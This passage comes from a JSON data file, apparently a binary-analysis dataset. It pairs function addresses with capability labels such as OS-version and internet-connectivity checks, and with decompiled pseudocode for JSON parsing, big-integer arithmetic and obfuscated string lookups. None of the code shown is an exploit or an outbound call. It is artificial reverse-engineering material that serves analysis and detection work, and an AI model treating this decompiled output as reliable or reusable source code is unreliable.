        "decompiled_code": "\nuint32_t fcn.00402699(void)\n\n{\n    uint32_t in_EAX;\n    uint uVar1;\n    int64_t iVar2;\n    \n    if (*0x433e01 == '\\0') {\n        *0x433e01 = '\\x01';\n        uVar1 = fcn.00407c34(0x411ec4, 0x18, 0xffa7c5e2);\n        in_EAX = fcn.004067d6(uVar1);\n        if (in_EAX == 0) {\n            fcn.00407c1d(0x411ee0, 5, 0x5fc616ff);\n            fcn.00402cec();\n            iVar2 = fcn.00402da4();\n            in_EAX = iVar2 | iVar2 >> 0x20;\n            *0x433e00 = 1;\n            if (iVar2 == 0) {\n                *0x433e00 = 0;\n            }\n        }\n        else {\n            *0x433e00 = 1;\n        }\n    }\n    return in_EAX & 0xffffff00 | *0x433e00;\n}\n",
        "token_count": 257
    },
    "0040270a": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.0040270a(void)\n\n{\n    uint32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x433e03 == '\\0') {\n        *0x433e03 = 1;\n        uVar1 = fcn.00407c34(0x411ee8, 0x19, 0xbf69a1d8);\n        iVar2 = fcn.004067d6(uVar1);\n        *0x433e02 = 1 - (iVar2 != 0);\n        return -iVar2 & 0xffffff00U | *0x433e02;\n    }\n    return in_EAX & 0xffffff00 | *0x433e02;\n}\n",
        "token_count": 166
    },
    "004028d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004028d0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t arg_8h_00;\n    uint32_t **ppuVar3;\n    uint32_t *unaff_EDI;\n    uint32_t var_4h;\n    \n    if (((*(unaff_EDI + 5) == '\\0') && (uVar1 = *unaff_EDI,  uVar1 != 0)) && (uVar1 < 0x10)) {\n        var_4h = 0;\n        ppuVar3 = unaff_EDI[2];\n        if (uVar1 != 0) {\n            do {\n                if (ppuVar3 == NULL) {\n                    return;\n                }\n                do {\n                    if (ppuVar3[1] == unaff_EDI) break;\n                    ppuVar3 = *ppuVar3;\n                } while (ppuVar3 != NULL);\n                if (ppuVar3 == NULL) {\n                    return;\n                }\n                arg_8h_00 = fcn.0040e2b9(0);\n                if (arg_8h_00 != 0) {\n                    cVar2 = fcn.00402894(arg_8h_00);\n                    if (cVar2 == '\\0') {\n                        cVar2 = fcn.00402699(arg_8h);\n                        if (cVar2 != '\\0') {\n                            fcn.004025de(arg_8h, 0x411f04, arg_8h_00);\n                        }\n                        *(unaff_EDI + 1) = 1;\n                    }\n                    fcn.00406d25();\n                }\n                if (*(unaff_EDI + 1) != '\\0') {\n                    return;\n                }\n                var_4h = var_4h + 1;\n                ppuVar3 = *ppuVar3;\n            } while (var_4h < *unaff_EDI);\n        }\n    }\n    return;\n}\n",
        "token_count": 448
    },
    "00402a9e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nchar * fcn.00402a9e(void)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    \n    pcVar2 = fcn.00407c87();\n    if (pcVar2 != NULL) {\n        cVar1 = *pcVar2;\n        pcVar5 = pcVar2;\n        while (cVar1 != '\\0') {\n            uVar3 = fcn.00407c1d(0x411f60, 0xe, 0xb196f47a, *pcVar5);\n            iVar4 = (**0x413154)(uVar3);\n            if (iVar4 != 0) {\n                *pcVar5 = '_';\n            }\n            pcVar5 = pcVar5 + 1;\n            cVar1 = *pcVar5;\n        }\n    }\n    return pcVar2;\n}\n",
        "token_count": 205
    },
    "00402b55": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00402b55(int32_t param_1, char param_2)\n\n{\n    if (param_1 != 0) {\n        do {\n            fcn.00406d25();\n            if (*(param_1 + 0x18) == '\\0') {\n                fcn.00406d25();\n                if (*(param_1 + 0x14) == 3) {\n                    fcn.00406d25();\n                }\n                if (*(param_1 + 0x10) != 0) {\n                    fcn.00402b55(*(param_1 + 0x10), 1);\n                }\n            }\n            if (param_2 == '\\0') {\n                fcn.00402d5f();\n                fcn.00406d25();\n                return;\n            }\n            param_1 = *(param_1 + 8);\n            fcn.00406d25();\n        } while (param_1 != 0);\n    }\n    return;\n}\n",
        "token_count": 215
    },
    "00402c13": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402c13(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_2 + 0x10);\n    if (iVar1 == 0) {\n        *(param_2 + 0x10) = param_1;\n    }\n    else {\n        for (; *(iVar1 + 8) != 0; iVar1 = *(iVar1 + 8)) {\n        }\n        *(iVar1 + 8) = param_1;\n        *(param_1 + 0xc) = iVar1;\n    }\n    *(param_1 + 4) = param_2;\n    return;\n}\n",
        "token_count": 153
    },
    "00403041": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00403041(int32_t arg_8h, uint arg_ch, uint32_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    uint *puVar10;\n    uint32_t var_18h;\n    uint8_t *var_14h;\n    uint8_t *var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = fcn.00407c1d(0x411f90, 4, 0x22ccf755);\n    pcVar3 = fcn.00402f1c(uVar2);\n    if ((pcVar3 != NULL) && (*pcVar3 == '\\\"')) {\n        puVar7 = pcVar3 + 1;\n        *arg_10h = *arg_10h - 1;\n        if (*arg_10h != 0) {\n            var_8h = 0;\n            uVar1 = *puVar7;\n            var_10h = puVar7;\n            while (((uVar1 != 0 && (*var_10h != 0x22)) && (*arg_10h != 0))) {\n                uVar4 = *arg_10h - 1;\n                *arg_10h = uVar4;\n                puVar9 = var_10h + 1;\n                uVar6 = var_8h + 1;\n                if (*var_10h == 0x5c) {\n                    if (var_10h[1] == 0x75) {\n                        puVar9 = var_10h + 6;\n                        uVar6 = uVar4;\n                        if (4 < uVar4) {\n                            uVar6 = 5;\n                        }\n                        iVar5 = -uVar6;\n                        var_8h = var_8h + 3;\n                    }\n                    else {\n                        puVar9 = var_10h + 2;\n                        iVar5 = -1;\n                        var_8h = var_8h + 1;\n                    }\n                    *arg_10h = uVar4 + iVar5;\n                    uVar6 = var_8h;\n                }\n                var_8h = uVar6;\n                var_10h = puVar9;\n                uVar1 = *var_10h;\n            }\n            puVar9 = fcn.00406c7f();\n            if (puVar9 != NULL) {\n                var_4h = 0;\n                var_14h = puVar9;\n                if (var_8h != 0) {\n                    do {\n                        uVar6 = *puVar7;\n                        puVar8 = puVar7;\n                        if (*puVar7 == 0x5c) {\n                            puVar8 = puVar7 + 1;\n                            uVar1 = *puVar8;\n                            if (uVar1 == 0x62) {\n                                *puVar9 = 8;\n                                goto code_r0x00403286;\n                            }\n                            if (uVar1 == 0x66) {\n                                *puVar9 = 0xc;\n                                goto code_r0x00403286;\n                            }\n                            if (uVar1 == 0x6e) {\n                                *puVar9 = 10;\n                                goto code_r0x00403286;\n                            }\n                            if (uVar1 == 0x72) {\n                                *puVar9 = 0xd;\n                                goto code_r0x00403286;\n                            }\n                            if (uVar1 == 0x74) {\n                                *puVar9 = 9;\n                                goto code_r0x00403286;\n                            }\n                            if (uVar1 != 0x75) {\n                                *puVar9 = uVar1;\n                                goto code_r0x00403286;\n                            }\n                            puVar10 = &var_ch;\n                            uVar2 = fcn.00407c1d(0x411fa8, 3, 0x74f7a02f);\n                            iVar5 = fcn.00408010(uVar2, puVar10);\n                            if (((iVar5 == 0) || ((puVar8 = puVar7 + 5,  0xdbff < var_ch && (var_ch < 0xe000)))) ||\n                               (var_ch == 0)) goto code_r0x00403287;\n                            if ((var_ch != 0xfe) && (var_ch != 0xff)) {\n                                var_4h = var_4h + 2;\n                                uVar6 = var_ch;\n                                goto code_r0x0040310c;\n                            }\n                            if (var_ch - 0xd800 < 0x400) {\n                                if ((puVar7[6] == 0x5c) && (puVar7[7] == 0x75)) {\n                                    puVar10 = &var_18h;\n                                    uVar2 = fcn.00407c1d(0x411fa8, 3, 0x74f7a02f);\n                                    iVar5 = fcn.00408010(uVar2, puVar10);\n                                    if ((iVar5 != 0) && (puVar8 = puVar7 + 0xb,  var_18h - 0xdc00 < 0x400)) {\n                                        var_ch = (var_18h & 0x3bf | 0x40) << 10 | var_18h & 0x3ff;\n                                        goto code_r0x0040321e;\n                                    }\n                                }\n                            }\n                            else {\ncode_r0x0040321e:\n                                if (var_ch < 0x80) {\n                                    uVar6 = 1;\n                                    uVar4 = uVar6;\n                                }\n                                else if (var_ch < 0x800) {\n                                    uVar6 = 2;\n                                    uVar4 = uVar6;\n                                }\n                                else {\n                                    uVar6 = 4 - (var_ch < 0x10000);\n                                    uVar4 = uVar6;\n                                }\n                                for (; 1 < uVar6; uVar6 = uVar6 - 1) {\n                                    puVar9[uVar6 - 1] = var_ch & 0x3f | 0x80;\n                                    var_ch = var_ch >> 6;\n                                }\n                                *puVar9 = *(uVar4 + 0x4140e4) | var_ch;\n                                puVar9 = puVar9 + uVar4;\n                                var_4h = var_4h + uVar4;\n                            }\n                        }\n                        else {\ncode_r0x0040310c:\n                            *puVar9 = uVar6;\ncode_r0x00403286:\n                            puVar9 = puVar9 + 1;\n                        }\ncode_r0x00403287:\n                        puVar7 = puVar8 + 1;\n                        var_4h = var_4h + 1;\n                    } while (var_4h < var_8h);\n                }\n                *puVar9 = 0;\n                uVar2 = fcn.0040796f(var_14h, puVar9 - var_14h);\n                *(arg_8h + 0x20) = uVar2;\n                fcn.00406d25();\n                pcVar3 = fcn.00402f42();\n                return pcVar3;\n            }\n        }\n        pcVar3 = NULL;\n    }\n    return pcVar3;\n}\n",
        "token_count": 1694
    },
    "004032cf": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004032cf(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    char *pcVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    uVar1 = fcn.00407c1d(0x411f90, 4, 0x22ccf755);\n    pcVar2 = fcn.00402f1c(uVar1);\n    if (((pcVar2 != NULL) && (*pcVar2 == '[')) && (pcVar2 = fcn.00402f42(),  pcVar2 != NULL)) {\n        if (*pcVar2 == ']') {\ncode_r0x00403397:\n            uVar1 = fcn.00402f42();\n            return uVar1;\n        }\n        arg_8h = fcn.00402f0b(param_1);\n        *(param_1 + 0x10) = arg_8h;\n        if (((arg_8h != 0) && (pcVar2 = fcn.004034f3(arg_8h, pcVar2, in_EAX),  pcVar2 != NULL)) && (*in_EAX != 0)) {\n            while (((*pcVar2 == ',' && (pcVar2 = fcn.00402f42(),  pcVar2 != NULL)) &&\n                   (arg_8h_00 = fcn.00402f0b(param_1),  arg_8h_00 != 0))) {\n                *(arg_8h + 8) = arg_8h_00;\n                *(arg_8h_00 + 0xc) = arg_8h;\n                pcVar2 = fcn.004034f3(arg_8h_00, pcVar2, in_EAX);\n                if ((pcVar2 == NULL) || (arg_8h = arg_8h_00,  *in_EAX == 0)) break;\n            }\n            if ((*in_EAX != 0) && ((pcVar2 != NULL && (*pcVar2 == ']')))) goto code_r0x00403397;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 483
    },
    "004033a9": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004033a9(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    char *pcVar2;\n    int32_t arg_8h_00;\n    int32_t var_4h;\n    \n    uVar1 = fcn.00407c1d(0x411f90, 4, 0x22ccf755);\n    pcVar2 = fcn.00402f1c(uVar1);\n    if (((pcVar2 != NULL) && (*pcVar2 == '{')) && (pcVar2 = fcn.00402f42(),  pcVar2 != NULL)) {\n        if (*pcVar2 == '}') {\ncode_r0x004034e0:\n            uVar1 = fcn.00402f42();\n            return uVar1;\n        }\n        var_4h = fcn.00402f0b(arg_8h);\n        *(arg_8h + 0x10) = var_4h;\n        if ((var_4h != 0) && (pcVar2 = fcn.00403041(var_4h, pcVar2, in_EAX),  pcVar2 != NULL)) {\n            uVar1 = *(var_4h + 0x20);\n            *(var_4h + 0x20) = 0;\n            *(var_4h + 0x1c) = uVar1;\n            if (*pcVar2 == ':') {\n                *in_EAX = *in_EAX + -1;\n                if (((*in_EAX != 0) && (pcVar2 = fcn.004034f3(var_4h, pcVar2 + 1, in_EAX),  pcVar2 != NULL)) &&\n                   (*in_EAX != 0)) {\n                    while (((*pcVar2 == ',' && (pcVar2 = fcn.00402f42(),  pcVar2 != NULL)) &&\n                           (arg_8h_00 = fcn.00402f0b(arg_8h),  arg_8h_00 != 0))) {\n                        *(var_4h + 8) = arg_8h_00;\n                        *(arg_8h_00 + 0xc) = var_4h;\n                        pcVar2 = fcn.00403041(arg_8h_00, pcVar2, in_EAX);\n                        if (pcVar2 == NULL) break;\n                        uVar1 = *(arg_8h_00 + 0x20);\n                        *(arg_8h_00 + 0x20) = 0;\n                        *(arg_8h_00 + 0x1c) = uVar1;\n                        if (*pcVar2 != ':') break;\n                        *in_EAX = *in_EAX + -1;\n                        if (*in_EAX == 0) {\n                            return 0;\n                        }\n                        pcVar2 = fcn.004034f3(arg_8h_00, pcVar2 + 1, in_EAX);\n                        if ((pcVar2 == NULL) || (var_4h = arg_8h_00,  *in_EAX == 0)) break;\n                    }\n                    if ((*in_EAX != 0) && ((pcVar2 != NULL && (*pcVar2 == '}')))) goto code_r0x004034e0;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 761
    },
    "0040392d": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.0040392d(int32_t param_1, int32_t param_2)\n\n{\n    uint arg_ch;\n    uint arg_8h;\n    uint *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    arg_ch = in_EAX[1];\n    arg_8h = *in_EAX;\n    iVar1 = fcn.00404372();\n    uVar2 = iVar1 + 7U >> 3;\n    if (uVar2 == 0) {\n        uVar2 = 1;\n    }\n    if ((param_1 != 0) && (param_2 != 0)) {\n        uVar2 = fcn.00404758(arg_8h, arg_ch, param_1, param_2);\n    }\n    return uVar2;\n}\n",
        "token_count": 185
    },
    "00403a4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00403a4c(uint *param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = param_1[1];\n    if ((iVar2 == 0) || (param_2 == 0)) {\n        fcn.004038a3(0);\n    }\n    else {\n        fcn.004038a3(iVar2 + 1);\n        iVar1 = fcn.00404608(*param_1, param_2);\n        if (iVar1 == 0) {\n            iVar2 = fcn.0040435e(*in_EAX);\n            in_EAX[1] = iVar2;\n        }\n        else {\n            *(*in_EAX + iVar2 * 4) = iVar1;\n            in_EAX[1] = iVar2 + 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 209
    },
    "00403f7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403f7c(int32_t arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, uint arg_18h)\n\n{\n    bool bVar1;\n    int32_t arg_14h_00;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t arg_8h_00;\n    int32_t *piVar4;\n    uint *puVar5;\n    uint *unaff_EBX;\n    int32_t iVar6;\n    ulong uVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    int32_t *var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.004043b8();\n    fcn.004043b8();\n    arg_14h_00 = fcn.0040435e(arg_14h);\n    uVar7 = fcn.0040435e(arg_ch);\n    puVar5 = uVar7 >> 0x20;\n    iVar6 = uVar7 - arg_14h_00;\n    if (arg_14h_00 == 0) {\n        return 0xffffffff;\n    }\n    if (arg_14h_00 == 1) {\n        uVar2 = fcn.00404668(arg_ch, *puVar5);\n        *unaff_EBX = uVar2;\n        return 0;\n    }\n    if (iVar6 < 0) {\ncode_r0x00403fe6:\n        fcn.004043a4();\n    }\n    else {\n        if (iVar6 == 0) {\n            iVar3 = fcn.0040430d(arg_ch);\n            if (iVar3 < 0) goto code_r0x00403fe6;\n            puVar5 = arg_14h;\n            if (iVar3 == 0) {\n                fcn.004043d4();\n                return 0;\n            }\n        }\n        var_8h = 0;\n        var_18h = 0x80000000;\n        do {\n            if ((var_18h & puVar5[arg_14h_00 + -1]) != 0) break;\n            var_18h = var_18h >> 1;\n            var_8h = var_8h + 1;\n        } while (var_8h < 0x20);\n        fcn.004043ec(puVar5, puVar5, var_8h, arg_14h_00);\n        iVar3 = iVar6 + arg_14h_00;\n        arg_8h_00 = fcn.004043ec(unaff_EBX, arg_ch, var_8h, iVar3);\n        var_10h = unaff_EBX + iVar6;\n        var_18h = iVar6;\n        var_14h = unaff_EBX + iVar3 + -1;\n        do {\n            bVar1 = false;\n            iVar6 = fcn.00403c7e(&var_4h, &var_ch, arg_14h[arg_14h_00 + -1]);\n            if (iVar6 == 0) {\ncode_r0x004040c4:\n                if ((var_4h != 0) && (!bVar1)) goto code_r0x004040d0;\n            }\n            else {\n                var_4h = -1;\n                var_ch = *var_14h + arg_14h[arg_14h_00 + -1];\n                if (var_ch < arg_14h[arg_14h_00 + -1]) {\n                    bVar1 = true;\n                    goto code_r0x004040c4;\n                }\ncode_r0x004040d0:\n                uVar2 = unaff_EBX[arg_14h_00 + -2 + var_18h];\n                iVar6 = fcn.00403f51(uVar2);\n                if (iVar6 != 0) {\n                    var_4h = var_4h + -1;\n                    var_ch = var_ch + arg_14h[arg_14h_00 + -1];\n                    if ((arg_14h[arg_14h_00 + -1] <= var_ch) && (iVar6 = fcn.00403f51(uVar2),  iVar6 != 0)) {\n                        var_4h = var_4h + -1;\n                    }\n                }\n            }\n            iVar6 = fcn.00403ee7(arg_8h_00, arg_14h, var_4h);\n            piVar4 = (arg_8h - unaff_EBX) + var_10h;\n            *piVar4 = var_4h;\n            if (iVar6 != 0) {\n                *piVar4 = var_4h + -1;\n                fcn.00403e10(arg_14h);\n            }\n            var_18h = var_18h + -1;\n            var_10h = var_10h + -1;\n            arg_8h_00 = *var_14h;\n            var_14h = var_14h + -1;\n        } while (-1 < var_18h);\n        if (arg_14h_00 < iVar3) {\n            puVar5 = unaff_EBX + arg_14h_00;\n            for (iVar3 = iVar3 - arg_14h_00; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n        }\n        fcn.004044b1(unaff_EBX, unaff_EBX, var_8h, arg_14h_00);\n        fcn.004044b1(arg_14h, arg_14h, var_8h, arg_14h_00);\n    }\n    return 0;\n}\n",
        "token_count": 1337
    },
    "004041a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004041a4(uint *arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    bool bVar8;\n    uint var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_14h = arg_10h * 2;\n    iVar2 = var_14h;\n    puVar6 = arg_8h;\n    if (var_14h != 0) {\n        for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n    }\n    var_4h = 0;\n    var_14h = var_14h + -1;\n    if (arg_10h != 0) {\n        uVar7 = 1;\n        var_18h = arg_8h + arg_10h;\n        do {\n            iVar2 = uVar7 * 2 + -2;\n            fcn.00403bfe();\n            uVar3 = arg_8h[iVar2];\n            var_20h = var_20h + uVar3;\n            if (var_20h < uVar3) {\n                var_1ch = var_1ch + 1;\n            }\n            uVar3 = 0;\n            if ((iVar2 == var_14h) && (var_4h != 0)) {\n                var_1ch = var_1ch + var_4h;\n                uVar3 = var_1ch < var_4h;\n                var_4h = 0;\n            }\n            arg_8h[iVar2] = var_20h;\n            if (uVar7 < arg_10h) {\n                var_10h = uVar7 * 2 + -1;\n                puVar4 = arg_8h + var_10h;\n                var_24h = uVar3;\n                var_8h = uVar7;\n                do {\n                    fcn.00403bfe();\n                    uVar5 = var_20h * 2 + var_1ch;\n                    uVar3 = -(var_1ch >> 0x1f);\n                    uVar1 = var_1ch * 2 | var_20h >> 0x1f;\n                    if ((uVar5 < var_1ch) && (uVar1 = uVar1 + 1,  uVar1 == 0)) {\n                        uVar3 = uVar3 + 1;\n                    }\n                    var_1ch = uVar1 + var_24h;\n                    if (var_1ch < var_24h) {\n                        uVar3 = uVar3 + 1;\n                    }\n                    var_20h = uVar5 + *puVar4;\n                    if ((var_20h < *puVar4) && (var_1ch = var_1ch + 1,  var_1ch == 0)) {\n                        uVar3 = uVar3 + 1;\n                    }\n                    if ((var_10h == var_14h) && (var_4h != 0)) {\n                        var_1ch = var_1ch + var_4h;\n                        if (var_1ch < var_4h) {\n                            uVar3 = uVar3 + 1;\n                        }\n                        var_4h = 0;\n                    }\n                    var_8h = var_8h + 1;\n                    *puVar4 = var_20h;\n                    puVar4 = puVar4 + 1;\n                    var_10h = var_10h + 1;\n                    var_24h = uVar3;\n                } while (var_8h < arg_10h);\n            }\n            *var_18h = var_1ch;\n            var_14h = (arg_10h - 1) + uVar7;\n            bVar8 = uVar7 < arg_10h;\n            uVar7 = uVar7 + 1;\n            var_18h = var_18h + 1;\n            var_4h = uVar3;\n        } while (bVar8);\n    }\n    return 0;\n}\n",
        "token_count": 1041
    },
    "0040433e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040433e(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (param_2 != 0) {\n        do {\n            if (*(param_1 + uVar1 * 4) != 0) {\n                return 0;\n            }\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < param_2);\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "0040435e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0040435e(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    do {\n        iVar1 = in_EAX;\n        if (iVar1 == 0) {\n            return 0;\n        }\n        in_EAX = iVar1 + -1;\n    } while (*(param_1 + (iVar1 + -1) * 4) == 0);\n    return iVar1;\n}\n",
        "token_count": 103
    },
    "004044b1": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004044b1(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t *puVar5;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if (arg_10h < 0x20) {\n        var_8h = 0;\n        uVar2 = arg_10h;\n        var_4h = arg_14h;\n        uVar1 = var_8h;\n        if (arg_14h != 0) {\n            puVar5 = arg_ch + arg_14h * 4;\n            do {\n                var_4h = var_4h - 1;\n                puVar5 = puVar5 + -1;\n                uVar1 = (*puVar5 & ~(-1 << (uVar2 & 0x1f))) << (0x20 - uVar2 & 0x1f);\n                *((arg_8h - arg_ch) + puVar5) = *puVar5 >> (uVar2 & 0x1f) | var_8h;\n                var_8h = uVar1;\n            } while (var_4h != 0);\n        }\n    }\n    else {\n        uVar3 = 0;\n        uVar1 = arg_10h >> 5;\n        if (arg_14h != 0) {\n            puVar4 = arg_ch + uVar1 * 4;\n            do {\n                if (uVar3 + uVar1 < arg_14h) {\n                    *(arg_8h + uVar3 * 4) = *puVar4;\n                }\n                else {\n                    *(arg_8h + uVar3 * 4) = 0;\n                }\n                uVar3 = uVar3 + 1;\n                puVar4 = puVar4 + 1;\n            } while (uVar3 < arg_14h);\n        }\n        arg_10h = arg_10h & 0x1f;\n        uVar1 = *(arg_ch + -4 + uVar1 * 4) >> arg_10h;\n        if (arg_10h != 0) {\n            uVar3 = fcn.004044b1(arg_8h, arg_8h, arg_10h, arg_14h);\n            uVar1 = uVar1 | uVar3;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 589
    },
    "00404721": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00404721(uint32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    if (param_2 == 0) {\n        return -1;\n    }\n    uVar1 = 1;\n    if (1 < param_2) {\n        do {\n            if (param_1[uVar1] != 0) {\n                return 1;\n            }\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < param_2);\n    }\n    return (1 < *param_1) - (*param_1 == 0);\n}\n",
        "token_count": 145
    },
    "004057ad": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
